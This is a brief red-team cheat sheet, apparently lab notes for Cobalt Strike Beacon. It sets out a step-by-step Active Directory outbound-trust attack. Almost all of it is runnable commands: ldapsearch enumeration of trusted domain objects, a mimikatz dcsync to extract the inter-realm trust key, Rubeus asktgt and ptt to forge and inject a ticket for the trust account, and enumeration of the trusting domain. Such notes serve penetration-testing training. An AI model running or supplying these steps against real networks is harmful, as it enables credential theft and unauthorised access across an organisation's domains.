# Outbound Trust Attack

1.  Enumerate the one-way trust.

    ```batch
    ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
    ```
2.  On the medium integrity Beacon, get the GUID of the TDO.

    ```batch
    ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
    ```
3. Obtain the shared inter-realm key from the TDO.
   1. `mimikatz lsadump::dcsync /domain:partner.com /guid:{[GUID]}`
4.  Request a TGT for the trust account using the shared secret.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:[RC4 HASH] /nowrap
    ```
5. On the high integrity Beacon, inject the TGT into a sacrifial logon session.
   1. `make_token CONTOSO\PARTNER$ FakePass`
   2. `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]`
6. Verify the ticket has been injected.
   1. `run klist`
7.  Enumerate the trusted domain.

    ```batch
    ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com
    ```

\
